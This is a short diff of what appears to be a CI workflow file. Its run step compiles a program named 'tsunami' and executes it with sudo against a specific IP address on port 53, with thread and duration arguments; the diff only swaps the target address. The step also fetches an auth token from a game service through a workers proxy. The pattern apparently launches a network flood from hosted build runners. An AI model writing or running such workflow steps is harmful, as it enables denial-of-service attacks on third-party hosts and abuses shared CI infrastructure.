@@ -26,7 +26,7 @@ jobs:
       - name: Run
         run: |
           clang -std=c23 -march=native -O3 -o tsunami tsunami.c -pthread
-          sudo ./tsunami 50.7.22.221 53 128 30 1024
+          sudo ./tsunami 50.7.22.222 53 128 30 1024
           curl https://super-flower-5d48.kolyagrozy.workers.dev/https/gw.sandboxol.com/user/api/v5/account/auth-token
           sudo iptables -L -n -v
           for i in {1..1}; do
